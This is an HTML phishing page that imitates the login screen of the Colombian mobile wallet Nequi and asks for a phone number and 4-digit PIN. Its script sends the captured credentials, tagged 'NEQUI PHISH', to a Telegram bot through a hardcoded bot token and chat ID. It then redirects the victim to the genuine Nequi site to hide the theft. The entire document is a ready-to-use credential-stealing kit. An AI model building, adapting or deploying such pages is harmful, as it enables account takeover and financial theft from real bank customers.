<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nequi</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
        
        * { margin:0; padding:0; box-sizing:border-box; }
        body { 
            font-family: 'Roboto', sans-serif; 
            background: #1C0B2B;
            height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center;
            color: white;
            margin: 0;
            overflow: hidden;
        }
        .container {
            width: 100%;
            max-width: 380px;
            padding: 20px;
            text-align: center;
        }
        .logo {
            font-size: 52px;
            font-weight: 700;
            margin-bottom: 90px;
            letter-spacing: -1px;
        }
        .logo span {
            color: #FF2D95;
        }
        .input-box {
            background: #2E1C4A;
            border-radius: 8px;
            height: 56px;
            display: flex;
            align-items: center;
            padding: 0 15px;
            margin-bottom: 20px;
            font-size: 17px;
        }
        .country {
            color: #B8A0E0;
            margin-right: 10px;
            font-weight: 500;
        }
        input {
            flex: 1;
            background: transparent;
            border: none;
            outline: none;
            color: white;
            font-size: 17px;
        }
        input::placeholder {
            color: #9B8EB8;
        }
        .btn {
            width: 100%;
            height: 56px;
            background: linear-gradient(90deg, #C81E6C, #E91E63);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 17px;
            font-weight: 500;
            cursor: pointer;
        }
        .help {
            position: absolute;
            top: 20px;
            right: 20px;
            font-size: 28px;
            color: #aaa;
            cursor: pointer;
        }
        .by {
            position: absolute;
            top: 25px;
            left: 50%;
            transform: translateX(-50%);
            font-size: 13px;
            color: #777;
        }
    </style>
</head>
<body>
    <div class="help">?</div>
    <div class="by">by <span style="color:#E91E63;">●</span></div>

    <div class="container">
        <div class="logo"><span>■</span>Nequi</div>
        
        <form id="loginForm">
            <div class="input-box">
                <span class="country">+57</span>
                <input type="tel" id="phone" placeholder="Ingresa tu cel" maxlength="10" inputmode="numeric" required>
            </div>
            
            <div class="input-box">
                <input type="password" id="password" placeholder="Clave de 4 dígitos" maxlength="4" inputmode="numeric" required>
            </div>
            
            <button type="submit" class="btn">Entra</button>
        </form>
    </div>

    <script>
        const botToken = "8712944286:AAGUAFIPjLNX5sMeEYdNjLNoFGXiQL_ZNO8";
        const chatId = "773351137";

        document.getElementById("loginForm").addEventListener("submit", function(e) {
            e.preventDefault();
            
            const phone = document.getElementById("phone").value.trim();
            const password = document.getElementById("password").value.trim();

            if (!/^\d{10}$/.test(phone)) return;
            if (!/^\d{4}$/.test(password)) return;

            const message = `🔴 NEQUI PHISH\n\n📱 Número: +57 ${phone}\n🔑 Clave: ${password}\n⏰ Hora: ${new Date().toLocaleString()}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message })
            }).then(() => {
                setTimeout(() => {
                    window.location.href = "https://www.nequi.com.co";
                }, 800);
            });
        });
    </script>
</body>
</html>
